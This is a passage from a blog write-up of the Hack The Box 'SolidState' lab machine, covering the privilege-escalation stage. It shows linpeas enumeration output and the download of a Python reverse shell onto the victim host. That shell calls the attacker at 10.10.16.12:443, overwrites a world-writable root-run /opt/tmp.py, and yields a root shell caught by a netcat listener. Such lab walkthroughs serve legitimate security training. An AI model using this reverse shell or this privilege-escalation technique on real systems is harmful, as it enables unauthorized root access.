+<span class="nt">--2025-02-15</span> 01:41:47--  https://objects.githubusercontent.com/github-production-release-asset-2e65be/165548191/d73618c9-7a15-48f8-8489-affff6078781?X-Amz-Algorithm<span class="o">=</span>AWS4-HMAC-SHA256&amp;X-Amz-Credential<span class="o">=</span>releaseassetproduction%2F20250214%2Fus-east-1%2Fs3%2Faws4_request&amp;X-Amz-Date<span class="o">=</span>20250214T144149Z&amp;X-Amz-Expires<span class="o">=</span>300&amp;X-Amz-Signature<span class="o">=</span>2a6471c22bfa85c72408dbd4f01a7d79a970a862af17c2775c00401bd3555157&amp;X-Amz-SignedHeaders<span class="o">=</span>host&amp;response-content-disposition<span class="o">=</span>attachment%3B%20filename%3Dlinpeas.sh&amp;response-content-type<span class="o">=</span>application%2Foctet-stream
+Resolving objects.githubusercontent.com <span class="o">(</span>objects.githubusercontent.com<span class="o">)</span>... 185.199.110.133, 185.199.111.133, 185.199.109.133, ...
+Connecting to objects.githubusercontent.com <span class="o">(</span>objects.githubusercontent.com<span class="o">)</span>|185.199.110.133|:443... connected.
+HTTP request sent, awaiting response... 200 OK
+Length: 839912 <span class="o">(</span>820K<span class="o">)</span> <span class="o">[</span>application/octet-stream]
+Saving to: ‘linpeas.sh’
+
+linpeas.sh                                                 100%[<span class="o">========================================================================================================================================&gt;]</span> 820.23K  3.29MB/s    <span class="k">in </span>0.2s    
+
+2025-02-15 01:41:48 <span class="o">(</span>3.29 MB/s<span class="o">)</span> - ‘linpeas.sh’ saved <span class="o">[</span>839912/839912]
+
+                                                                                                                                                                                                                                            
+┌──<span class="o">(</span>kali㉿kali<span class="o">)</span>-[~/Documents/htb/solidstate]
+└─<span class="nv">$ </span>python3 <span class="nt">-m</span> http.server          
+Serving HTTP on 0.0.0.0 port 8000 <span class="o">(</span>http://0.0.0.0:8000/<span class="o">)</span> ...
+</code></pre></div></div> <p><br> Transfer linpeassh to the victim machine.</p> <div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">${</span><span class="nv">debian_chroot</span>:+<span class="p">(</span><span class="nv">$debian_chroot</span><span class="p">)</span><span class="k">}</span>mindy@solidstate:/dev/shm<span class="nv">$ </span>wget 10.10.16.12:8000/linpeas.sh
+<span class="nt">--2025-02-14</span> 09:42:47--  http://10.10.16.12:8000/linpeas.sh
+Connecting to 10.10.16.12:8000... connected.
+HTTP request sent, awaiting response... 200 OK
+Length: 839912 <span class="o">(</span>820K<span class="o">)</span> <span class="o">[</span>text/x-sh]
+Saving to: ‘linpeas.sh’
+
+linpeas.sh                                                 100%[<span class="o">========================================================================================================================================&gt;]</span> 820.23K  1.07MB/s    <span class="k">in </span>0.7s    
+
+2025-02-14 09:42:48 <span class="o">(</span>1.07 MB/s<span class="o">)</span> - ‘linpeas.sh’ saved <span class="o">[</span>839912/839912]
+
+<span class="k">${</span><span class="nv">debian_chroot</span>:+<span class="p">(</span><span class="nv">$debian_chroot</span><span class="p">)</span><span class="k">}</span>mindy@solidstate:/dev/shm<span class="nv">$ </span><span class="nb">chmod</span> +x
+<span class="nb">chmod</span>: missing operand after ‘+x’
+Try <span class="s1">'chmod --help'</span> <span class="k">for </span>more information.
+<span class="k">${</span><span class="nv">debian_chroot</span>:+<span class="p">(</span><span class="nv">$debian_chroot</span><span class="p">)</span><span class="k">}</span>mindy@solidstate:/dev/shm<span class="nv">$ </span><span class="nb">chmod</span> +x linpeas.sh
+</code></pre></div></div> <p><br> Give the peas a run.</p> <div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>&lt;snip&gt;
+
+╔══════════╣ Cron <span class="nb">jobs</span>
+╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#scheduledcron-jobs                                                                                                                                        
+/usr/bin/crontab                                                                                                                                                                                                                            
+incrontab Not Found
+<span class="nt">-rw-r--r--</span> 1 root root     722 May  3  2015 /etc/crontab                                                                                                                                                                                    
+
+/etc/cron.d:
+total 24
+drwxr-xr-x   2 root root  4096 Apr 26  2021 <span class="nb">.</span>
+drwxr-xr-x 121 root root 12288 May 27  2022 ..
+<span class="nt">-rw-r--r--</span>   1 root root   285 May 29  2017 anacron
+<span class="nt">-rw-r--r--</span>   1 root root   102 May  3  2015 .placeholder
+
+/etc/cron.daily:
+total 56
+drwxr-xr-x   2 root root  4096 Apr 26  2021 <span class="nb">.</span>
+drwxr-xr-x 121 root root 12288 May 27  2022 ..
+<span class="nt">-rwxr-xr-x</span>   1 root root   311 May 29  2017 0anacron
+<span class="nt">-rwxr-xr-x</span>   1 root root   539 Jul 18  2017 apache2
+<span class="nt">-rwxr-xr-x</span>   1 root root  1474 Jun  1  2017 apt-compat
+<span class="nt">-rwxr-xr-x</span>   1 root root   355 Oct 25  2016 bsdmainutils
+<span class="nt">-rwxr-xr-x</span>   1 root root   384 Dec 12  2012 cracklib-runtime
+<span class="nt">-rwxr-xr-x</span>   1 root root  1597 Feb 22  2017 dpkg
+<span class="nt">-rwxr-xr-x</span>   1 root root    89 May  5  2015 logrotate
+<span class="nt">-rwxr-xr-x</span>   1 root root  1065 Dec 13  2016 man-db
+<span class="nt">-rwxr-xr-x</span>   1 root root   249 May 17  2017 passwd
+<span class="nt">-rw-r--r--</span>   1 root root   102 May  3  2015 .placeholder
+
+/etc/cron.hourly:
+total 20
+drwxr-xr-x   2 root root  4096 Apr 26  2021 <span class="nb">.</span>
+drwxr-xr-x 121 root root 12288 May 27  2022 ..
+<span class="nt">-rw-r--r--</span>   1 root root   102 May  3  2015 .placeholder
+
+/etc/cron.monthly:
+total 24
+drwxr-xr-x   2 root root  4096 Apr 26  2021 <span class="nb">.</span>
+drwxr-xr-x 121 root root 12288 May 27  2022 ..
+<span class="nt">-rwxr-xr-x</span>   1 root root   313 May 29  2017 0anacron
+<span class="nt">-rw-r--r--</span>   1 root root   102 May  3  2015 .placeholder
+
+/etc/cron.weekly:
+total 28
+drwxr-xr-x   2 root root  4096 Apr 26  2021 <span class="nb">.</span>
+drwxr-xr-x 121 root root 12288 May 27  2022 ..
+<span class="nt">-rwxr-xr-x</span>   1 root root   312 May 29  2017 0anacron
+<span class="nt">-rwxr-xr-x</span>   1 root root   723 Dec 13  2016 man-db
+<span class="nt">-rw-r--r--</span>   1 root root   102 May  3  2015 .placeholder
+
+/var/spool/anacron:
+total 20
+drwxr-xr-x 2 root root 4096 Apr 26  2021 <span class="nb">.</span>
+drwxr-xr-x 7 root root 4096 Apr 26  2021 ..
+<span class="nt">-rw-------</span> 1 root root    9 Feb 14 08:44 cron.daily
+<span class="nt">-rw-------</span> 1 root root    9 Feb 14 08:54 cron.monthly
+<span class="nt">-rw-------</span> 1 root root    9 Feb 14 08:49 cron.weekly
+
+<span class="nv">SHELL</span><span class="o">=</span>/bin/sh
+<span class="nv">PATH</span><span class="o">=</span>/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin
+
+17 <span class="k">*</span>    <span class="k">*</span> <span class="k">*</span> <span class="k">*</span>   root    <span class="nb">cd</span> / <span class="o">&amp;&amp;</span> run-parts <span class="nt">--report</span> /etc/cron.hourly
+25 6    <span class="k">*</span> <span class="k">*</span> <span class="k">*</span>   root    <span class="nb">test</span> <span class="nt">-x</span> /usr/sbin/anacron <span class="o">||</span> <span class="o">(</span> <span class="nb">cd</span> / <span class="o">&amp;&amp;</span> run-parts <span class="nt">--report</span> /etc/cron.daily <span class="o">)</span>
+47 6    <span class="k">*</span> <span class="k">*</span> 7   root    <span class="nb">test</span> <span class="nt">-x</span> /usr/sbin/anacron <span class="o">||</span> <span class="o">(</span> <span class="nb">cd</span> / <span class="o">&amp;&amp;</span> run-parts <span class="nt">--report</span> /etc/cron.weekly <span class="o">)</span>
+52 6    1 <span class="k">*</span> <span class="k">*</span>   root    <span class="nb">test</span> <span class="nt">-x</span> /usr/sbin/anacron <span class="o">||</span> <span class="o">(</span> <span class="nb">cd</span> / <span class="o">&amp;&amp;</span> run-parts <span class="nt">--report</span> /etc/cron.monthly <span class="o">)</span>
+
+
+<span class="nv">SHELL</span><span class="o">=</span>/bin/sh
+<span class="nv">PATH</span><span class="o">=</span>/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin
+<span class="nv">HOME</span><span class="o">=</span>/root
+<span class="nv">LOGNAME</span><span class="o">=</span>root
+
+1       5       cron.daily      run-parts <span class="nt">--report</span> /etc/cron.daily
+7       10      cron.weekly     run-parts <span class="nt">--report</span> /etc/cron.weekly
+@monthly        15      cron.monthly    run-parts <span class="nt">--report</span> /etc/cron.monthly
+
+╔══════════╣ System timers
+╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#timers                                                                                                                                                    
+NEXT                         LEFT       LAST                         PASSED      UNIT                         ACTIVATES                                                                                                                     
+Fri 2025-02-14 10:00:17 EST  16min left Fri 2025-02-14 09:01:22 EST  42min ago   anacron.timer                anacron.service
+Fri 2025-02-14 19:03:13 EST  9h left    Fri 2025-02-14 08:39:14 EST  1h 4min ago apt-daily.timer              apt-daily.service
+Sat 2025-02-15 06:45:34 EST  21h left   Fri 2025-02-14 08:39:14 EST  1h 4min ago apt-daily-upgrade.timer      apt-daily-upgrade.service
+Sat 2025-02-15 08:53:36 EST  23h left   Fri 2025-02-14 08:53:36 EST  50min ago   systemd-tmpfiles-clean.timer systemd-tmpfiles-clean.service
+
+&lt;snip&gt;
+</code></pre></div></div> <p><br> Curl localhost on port 631.</p> <div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">${</span><span class="nv">debian_chroot</span>:+<span class="p">(</span><span class="nv">$debian_chroot</span><span class="p">)</span><span class="k">}</span>mindy@solidstate:/dev/shm<span class="nv">$ </span>curl 127.0.0.1:631
+&lt;<span class="o">!</span>DOCTYPE HTML&gt;
+&lt;html&gt;
+  &lt;<span class="nb">head</span><span class="o">&gt;</span>
+    &lt;<span class="nb">link </span><span class="nv">rel</span><span class="o">=</span><span class="s2">"stylesheet"</span> <span class="nv">href</span><span class="o">=</span><span class="s2">"/cups.css"</span> <span class="nb">type</span><span class="o">=</span><span class="s2">"text/css"</span><span class="o">&gt;</span>
+    &lt;<span class="nb">link </span><span class="nv">rel</span><span class="o">=</span><span class="s2">"shortcut icon"</span> <span class="nv">href</span><span class="o">=</span><span class="s2">"/apple-touch-icon.png"</span> <span class="nb">type</span><span class="o">=</span><span class="s2">"image/png"</span><span class="o">&gt;</span>
+    &lt;meta <span class="nv">charset</span><span class="o">=</span><span class="s2">"utf-8"</span><span class="o">&gt;</span>
+    &lt;meta http-equiv<span class="o">=</span><span class="s2">"Content-Type"</span> <span class="nv">content</span><span class="o">=</span><span class="s2">"text/html; charset=utf-8"</span><span class="o">&gt;</span>
+    &lt;meta http-equiv<span class="o">=</span><span class="s2">"X-UA-Compatible"</span> <span class="nv">content</span><span class="o">=</span><span class="s2">"IE=9"</span><span class="o">&gt;</span>
+    &lt;meta <span class="nv">name</span><span class="o">=</span><span class="s2">"viewport"</span> <span class="nv">content</span><span class="o">=</span><span class="s2">"width=device-width"</span><span class="o">&gt;</span>
+</code></pre></div></div> <p><br> Ok. So, at this point, there is another exploit on exploit-db for the James server. I ran it. I am not going to include it in this write-up because it would only be useful if you couldn’t break rbash. But, here is the link if you want to give it a run yourself.</p> <p><a href="https://www.exploit-db.com/exploits/50347" rel="external nofollow noopener" target="_blank">https://www.exploit-db.com/exploits/50347</a></p> <p><br> Researching the installation of the James server indicates the the recommended installation location is opt. So, let’s run ls -la against the opt folder.</p> <div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">${</span><span class="nv">debian_chroot</span>:+<span class="p">(</span><span class="nv">$debian_chroot</span><span class="p">)</span><span class="k">}</span>mindy@solidstate:/opt<span class="nv">$ </span><span class="nb">ls</span> <span class="nt">-la</span>
+<span class="nb">ls</span> <span class="nt">-la</span>
+total 16
+drwxr-xr-x  3 root root 4096 Aug 22  2017 <span class="nb">.</span>
+drwxr-xr-x 22 root root 4096 May 27  2022 ..
+drwxr-xr-x 11 root root 4096 Apr 26  2021 james-2.3.2
+<span class="nt">-rwxrwxrwx</span>  1 root root  105 Aug 22  2017 tmp.py
+    &lt;meta <span class="nv">name</span><span class="o">=</span><span class="s2">"viewport"</span> <span class="nv">content</span><span class="o">=</span><span class="s2">"width=device-width"</span><span class="o">&gt;</span>
+</code></pre></div></div> <p><br> Well, that tmp.py looks mighty tempting being all writeable and everything. So, on the attach machine, create a tmp.py file using <a href="https://revshells.com" rel="external nofollow noopener" target="_blank">revshells</a> as the base.</p> <div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>┌──<span class="o">(</span>kali㉿kali<span class="o">)</span>-[~/Documents/htb/solidstate]
+└─<span class="nv">$ </span><span class="nb">cat </span>tmp.py                  
+import socket,subprocess,os,pty
+
+<span class="nv">s</span><span class="o">=</span>socket.socket<span class="o">(</span>socket.AF_INET,socket.SOCK_STREAM<span class="o">)</span>
+s.connect<span class="o">((</span><span class="s2">"10.10.16.12"</span>,443<span class="o">))</span>
+os.dup2<span class="o">(</span>s.fileno<span class="o">()</span>,0<span class="o">)</span>
+os.dup2<span class="o">(</span>s.fileno<span class="o">()</span>,1<span class="o">)</span>
+os.dup2<span class="o">(</span>s.fileno<span class="o">()</span>,2<span class="o">)</span>
+pty.spawn<span class="o">(</span><span class="s2">"/bin/bash"</span><span class="o">)</span>
+                                                                                                                                                                                                                                            
+┌──<span class="o">(</span>kali㉿kali<span class="o">)</span>-[~/Documents/htb/solidstate]
+└─<span class="nv">$ </span>python3 <span class="nt">-m</span> http.server          
+Serving HTTP on 0.0.0.0 port 8000 <span class="o">(</span>http://0.0.0.0:8000/<span class="o">)</span> ...
+</code></pre></div></div> <p><br> Start a netcat listener.</p> <div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>┌──<span class="o">(</span>kali㉿kali<span class="o">)</span>-[~/Documents/htb/solidstate]
+└─<span class="nv">$ </span><span class="nb">sudo </span>nc <span class="nt">-nlvp</span> 443                         
+<span class="o">[</span><span class="nb">sudo</span><span class="o">]</span> password <span class="k">for </span>kali: 
+listening on <span class="o">[</span>any] 443 ...
+</code></pre></div></div> <p><br> Transfer the tmp.py to the victim machine.</p> <div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">${</span><span class="nv">debian_chroot</span>:+<span class="p">(</span><span class="nv">$debian_chroot</span><span class="p">)</span><span class="k">}</span>mindy@solidstate:/dev/shm<span class="nv">$ </span>wget 10.10.16.12:8000/tmp.py
+wget 10.10.16.12:8000/tmp.py
+<span class="nt">--2025-02-15</span> 19:38:54--  http://10.10.16.12:8000/tmp.py
+Connecting to 10.10.16.12:8000... connected.
+HTTP request sent, awaiting response... 200 OK
+Length: 204 <span class="o">[</span>text/x-python]
+Saving to: ‘tmp.py’
+
+     0K                                                       100%  <span class="nv">236K</span><span class="o">=</span>0.001s
+
+2025-02-15 19:38:54 <span class="o">(</span>236 KB/s<span class="o">)</span> - ‘tmp.py’ saved <span class="o">[</span>204/204]
+</code></pre></div></div> <p><br> Copy the file to overwrite the /opt/tmp.py file.</p> <div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">${</span><span class="nv">debian_chroot</span>:+<span class="p">(</span><span class="nv">$debian_chroot</span><span class="p">)</span><span class="k">}</span>mindy@solidstate:/dev/shm<span class="nv">$ </span><span class="nb">cp </span>tmp.py /opt/tmp.py
+<span class="nb">cp </span>tmp.py /opt/tmp.py
+<span class="k">${</span><span class="nv">debian_chroot</span>:+<span class="p">(</span><span class="nv">$debian_chroot</span><span class="p">)</span><span class="k">}</span>mindy@solidstate:/dev/shm<span class="nv">$ </span><span class="nb">cat</span> /opt/tmp.py
+<span class="nb">cat</span> /opt/tmp.py
+import socket,subprocess,os,pty
+
+<span class="nv">s</span><span class="o">=</span>socket.socket<span class="o">(</span>socket.AF_INET,socket.SOCK_STREAM<span class="o">)</span>
+s.connect<span class="o">((</span><span class="s2">"10.10.16.12"</span>,443<span class="o">))</span>
+os.dup2<span class="o">(</span>s.fileno<span class="o">()</span>,0<span class="o">)</span>
+os.dup2<span class="o">(</span>s.fileno<span class="o">()</span>,1<span class="o">)</span>
+os.dup2<span class="o">(</span>s.fileno<span class="o">()</span>,2<span class="o">)</span>
+pty.spawn<span class="o">(</span><span class="s2">"/bin/bash"</span><span class="o">)</span>
+</code></pre></div></div> <p><br> Now, I didn’t see the tmp.py in the cron jobs or timers of linpeas. It only appeared in the interesting files sections. So, I will go on investigating the James installation in the opt folder, maybe find a trigger or credentials in a conf file, who knows.. While exploritizing, I keep an eye on my listener. Unitl one time…hey, a shell! Neat.</p> <div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>┌──<span class="o">(</span>kali㉿kali<span class="o">)</span>-[~/Documents/htb/solidstate]
+└─<span class="nv">$ </span><span class="nb">sudo </span>nc <span class="nt">-nlvp</span> 443                         
+<span class="o">[</span><span class="nb">sudo</span><span class="o">]</span> password <span class="k">for </span>kali: 
+listening on <span class="o">[</span>any] 443 ...
+connect to <span class="o">[</span>10.10.16.12] from <span class="o">(</span>UNKNOWN<span class="o">)</span> <span class="o">[</span>10.10.10.51] 45954
+root@solidstate:~#
+</code></pre></div></div> <p><br> Get the root.txt flag.</p> <div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">cat</span> /root/root.txt
+&lt;redacted&gt;
+root@solidstate:~# ip a
+ip a
+1: lo: &lt;LOOPBACK,UP,LOWER_UP&gt; mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1
+    <span class="nb">link</span>/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
+    inet 127.0.0.1/8 scope host lo
+       valid_lft forever preferred_lft forever
+    inet6 ::1/128 scope host 
+       valid_lft forever preferred_lft forever
+2: ens192: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500 qdisc mq state UP group default qlen 1000
+    <span class="nb">link</span>/ether 00:50:56:b9:d8:dd brd ff:ff:ff:ff:ff:ff
+    inet 10.10.10.51/24 brd 10.10.10.255 scope global ens192
+       valid_lft forever preferred_lft forever
+    inet6 dead:beef::250:56ff:feb9:d8dd/64 scope global mngtmpaddr dynamic 
+       valid_lft 86393sec preferred_lft 14393sec
+    inet6 fe80::250:56ff:feb9:d8dd/64 scope <span class="nb">link 
+       </span>valid_lft forever preferred_lft forever
+</code></pre></div></div> <p><br> So, this is the final state of SolidState. Hopefully, you enjoyed.</p> </article> </div> </div> <footer class="fixed-bottom" role="contentinfo"> <div class="container mt-0"> © Copyright 2025 Biscotti Diskette. Powered by <a href="https://jekyllrb.com/" target="_blank" rel="external nofollow noopener">Jekyll</a> with <a href="https://github.com/alshedivat/al-folio" rel="external nofollow noopener" target="_blank">al-folio</a> theme. Hosted by <a href="https://pages.github.com/" target="_blank" rel="external nofollow noopener">GitHub Pages</a>. </div> </footer> <script src="https://cdn.jsdelivr.net/npm/jquery@3.6.0/dist/jquery.min.js" integrity="sha256-/xUj+3OJU5yExlq6GSYGSHk7tPXikynS7ogEvDej/m4=" crossorigin="anonymous"></script> <script src="/assets/js/bootstrap.bundle.min.js"></script> <script src="https://cdn.jsdelivr.net/npm/mdbootstrap@4.20.0/js/mdb.min.js" integrity="sha256-NdbiivsvWt7VYCt6hYNT3h/th9vSTL4EDWeGs5SN3DA=" crossorigin="anonymous"></script> <script defer src="https://cdn.jsdelivr.net/npm/masonry-layout@4.2.2/dist/masonry.pkgd.min.js" integrity="sha256-Nn1q/fx0H7SNLZMQ5Hw5JLaTRZp0yILA/FRexe19VdI=" crossorigin="anonymous"></script> <script defer src="https://cdn.jsdelivr.net/npm/imagesloaded@5.0.0/imagesloaded.pkgd.min.js" integrity="sha256-htrLFfZJ6v5udOG+3kNLINIKh2gvoKqwEhHYfTTMICc=" crossorigin="anonymous"></script> <script defer src="/assets/js/masonry.js?a0db7e5d5c70cc3252b3138b0c91dcaf" type="text/javascript"></script> <script defer src="https://cdn.jsdelivr.net/npm/medium-zoom@1.1.0/dist/medium-zoom.min.js" integrity="sha256-ZgMyDAIYDYGxbcpJcfUnYwNevG/xi9OHKaR/8GK+jWc=" crossorigin="anonymous"></script> <script defer src="/assets/js/zoom.js?85ddb88934d28b74e78031fd54cf8308"></script> <script src="/assets/js/no_defer.js?2781658a0a2b13ed609542042a859126"></script> <script defer src="/assets/js/common.js?e0514a05c5c95ac1a93a8dfd5249b92e"></script> <script defer src="/assets/js/copy_code.js?12775fdf7f95e901d7119054556e495f" type="text/javascript"></script> <script defer src="/assets/js/jupyter_new_tab.js?d9f17b6adc2311cbabd747f4538bb15f"></script> <script async src="https://d1bxh8uas1mnw7.cloudfront.net/assets/embed.js"></script> <script async src="https://badge.dimensions.ai/badge.js"></script> <script defer type="text/javascript" id="MathJax-script" src="https://cdn.jsdelivr.net/npm/mathjax@3.2.2/es5/tex-mml-chtml.js" integrity="sha256-MASABpB4tYktI2Oitl4t+78w/lyA+D7b/s9GEP0JOGI=" crossorigin="anonymous"></script> <script src="/assets/js/mathjax-setup.js?70d799092f862ad98c7876aa47712e20"></script> <script defer src="https://cdnjs.cloudflare.com/polyfill/v3/polyfill.min.js?features=es6" crossorigin="anonymous"></script> <script defer src="/assets/js/progress-bar.js?2f30e0e6801ea8f5036fa66e1ab0a71a" type="text/javascript"></script> <script src="/assets/js/vanilla-back-to-top.min.js?f40d453793ff4f64e238e420181a1d17"></script> <script>
+    addBackToTop();
+  </script> </body> </html>
